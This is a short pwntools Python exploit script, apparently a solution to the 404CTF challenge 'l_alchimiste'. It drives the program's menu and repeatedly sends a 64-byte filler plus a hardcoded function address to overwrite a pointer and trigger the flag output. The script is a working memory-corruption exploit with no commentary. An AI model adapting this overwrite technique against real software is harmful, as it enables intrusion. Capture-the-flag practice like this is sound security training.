#!/usr/bin/env python3

from pwn import *
from time import sleep
from binascii import unhexlify


HOST = "challenges.404ctf.fr"
PORT = 30944

exe = ELF("./l_alchimiste")

context.binary = exe.path


def conn():
    if args.REMOTE:
        r = remote(HOST, PORT)
    elif args.TRACE:
        r  = process(["strace", "-o","strace.out", exe.path])
    else:
        r = process([exe.path])
    return r

def main():
    global r
    r = conn()


    incInt_addr = 0x004008d5

    rep = r.recvuntil(b'>>> ')
    r.send(b'1\n')
    rep = r.recvuntil(b'>>> ')


    for i in range(5):
    	r.send(b'2\n')
    	rep = r.recvuntil(b'>>> ')
    	r.send(b'3\n')
    	rep = r.recvuntil(b'[Vous] : ')
    	r.send(b'A'*16 + b'\n')
    	rep = r.recvuntil(b'>>> ')


    payload = b'A' * 8 * 8
    payload += p64(incInt_addr)

    for i in range(12):
        r.send(b'2\n')
        rep = r.recvuntil(b'>>> ')
        r.send(b'3\n')
        rep = r.recvuntil(b'[Vous] : ')
        r.send(payload + b'\n')
        rep = r.recvuntil(b'>>> ')


    r.send(b'5\n')
    rep = r.recv()
    print(rep.decode())

if __name__ == "__main__":
	main()
